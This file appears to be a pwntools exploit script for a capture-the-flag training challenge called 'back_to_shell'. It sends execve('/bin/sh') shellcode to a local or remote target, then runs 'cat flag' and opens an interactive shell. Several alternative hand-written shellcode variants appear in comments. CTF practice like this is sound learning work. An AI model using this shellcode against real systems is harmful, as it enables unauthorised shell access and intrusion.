from pwn import * 
context.arch = "amd64"
COMMANDS = """
"""
if args.REMOTE:
    c = remote("back-to-shell.training.offensivedefensive.it", 8080, ssl=True)
elif args.GDB:        
    c = gdb.debug("./back_to_shell", gdbscript = COMMANDS) 
else:
    c = process("./back_to_shell")

c.recvuntil("Shellcode: ")
shellcode = asm(shellcraft.sh()) # works

# shellcode = b"\x31\xF6\x31\xD2\x31\xC0\x48\xC7\xC0\x3B\x00\x00\x00\x31\xFF\x48\xBF\x2F\x62\x69\x6E\x2F\x73\x68\x00\x57\x48\x89\xE7\x0F\x05" # works

# shellcode = b"\x48\x89\xC7\x48\x83\xC7\x13\x48\x31\xC0\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05/bin/sh\0" # works

# shellcode = asm("""
# xor rax, rax
# mov rax, 0x3b
# xor edx, edx
# xor esi, esi
# xor rdi, rdi
# mov rdi, 0x68732f6e69622f
# push rdi
# mov rdi, rsp
# syscall
# """) # works
c.sendline(shellcode)
c.sendline("cat flag")
c.interactive()

